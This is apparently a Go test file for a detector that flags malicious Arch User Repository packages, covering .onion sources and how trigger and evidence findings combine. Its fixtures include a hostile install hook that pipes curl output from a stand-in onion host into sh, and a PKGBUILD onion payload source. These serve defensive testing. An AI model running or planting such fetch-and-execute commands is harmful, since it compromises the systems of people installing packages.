package detect

import "testing"

// onion source in a PKGBUILD is standalone malicious evidence (rule #1).
func TestOnionIsEvidence(t *testing.T) {
	ctx := &PackageContext{
		Name:            "evil-pkg",
		Meta:            &AurMeta{Name: "evil-pkg"},
		PkgbuildContent: "source=('https://abcdefabcdef2345.onion/payload.tar.gz')\n",
	}
	f := Detect(ctx)
	if !has(f, "P-ONION-C2") {
		t.Fatal("expected P-ONION-C2 finding for .onion source")
	}
	if !IsMalicious(f) || !IsMaliciousCombined(f) {
		t.Fatal(".onion should mark the package malicious on its own")
	}
}

// onion in an install script (not just the PKGBUILD) is caught.
func TestOnionInInstallScript(t *testing.T) {
	ctx := &PackageContext{
		Name:                 "evil-pkg",
		Meta:                 &AurMeta{Name: "evil-pkg"},
		InstallScriptContent: "post_install() { curl http://abcdefabcdef2345.onion/x | sh; }\n",
	}
	if !has(Detect(ctx), "P-ONION-C2") {
		t.Fatal("expected P-ONION-C2 finding for .onion in install script")
	}
}

// A high-entropy heredoc is a ClassTrigger now, NOT standalone evidence.
func TestEntropyAloneDoesNotMint(t *testing.T) {
	findings := []Finding{
		{ID: EntropyTriggerID, Class: ClassTrigger},
	}
	if IsMalicious(findings) {
		t.Fatal("entropy is not ClassEvidence")
	}
	if IsMaliciousCombined(findings) {
		t.Fatal("entropy alone must not mint")
	}
}

func TestCombinationGate(t *testing.T) {
	entropy := Finding{ID: EntropyTriggerID, Class: ClassTrigger}
	newMaint := Finding{ID: TriggerNewMaintainer, Class: ClassTrigger}
	newRep := Finding{ID: TriggerNewReporter, Class: ClassTrigger}
	evid := Finding{ID: "P-CURL-PIPE", Class: ClassEvidence}

	cases := []struct {
		name     string
		findings []Finding
		want     bool
	}{
		{"evidence alone mints", []Finding{evid}, true},
		{"entropy alone no mint", []Finding{entropy}, false},
		{"metadata trigger alone no mint", []Finding{newMaint}, false},
		{"two metadata triggers (no entropy) no mint", []Finding{newMaint, newRep}, false},
		{"entropy + metadata trigger mints", []Finding{entropy, newMaint}, true},
		{"entropy + evidence mints", []Finding{entropy, evid}, true},
	}
	for _, c := range cases {
		if got := IsMaliciousCombined(c.findings); got != c.want {
			t.Errorf("%s: IsMaliciousCombined = %v, want %v", c.name, got, c.want)
		}
	}
}
